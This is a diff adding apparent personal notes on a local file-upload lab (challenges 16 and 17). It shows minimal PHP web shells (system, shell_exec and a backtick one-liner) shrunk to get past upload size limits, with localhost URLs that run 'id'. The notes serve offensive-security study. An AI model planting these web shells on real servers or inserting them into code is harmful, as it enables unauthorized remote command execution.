@@ -116,6 +116,66 @@ If we can upload this file, all file that have extension .test are going to be i
 ![](../../Images/Pasted%20image%2020230822160515.png)
 ![](../../Images/Pasted%20image%2020230822160528.png)
 
+The solution of this is that a user can't upload a .htacess file
+
+---
+
+# Upload 16
+
+Now the restriction is by the size of the file
+
+In this case, we can see the max size in the **request**
+
+![](../../Images/Pasted%20image%2020230822162110.png)
+
+You can change the size of the file 
+
+or
+
+You can reduce the code of php (monkey pentester offers a reverse shell in one line for this occasions)
+
+In this case if you change a little the code, you can upload the file
+
+````php
+<?php system($_GET['c']);?>
+````
+
+You can use a 0 
+
+````php
+<?php system($_GET[0]);?>
+````
+
+In the url be like:
+
+> http://localhost:9001/upload16/uploads/cmd.php?0=id
+
+---
+
+# Upload 17
+
+In this case the size is less, when you try the web shell with
+
+````php
+<?php system($_GET[0]); ?>
+````
+
+Doesn't work, you can try with other utilities that exec, but doesn't work
+
+````php
+<?php shell_exec($_GET[0]); ?>
+````
+
+But you can limit this so much like this
+
+````php
+<?=`$_GET[0]`?>
+````
+
+To use this is equal than the other ocassions
+
+> http://localhost:9001/upload17/uploads/setenso.php?0=id
+
 
 
 ---
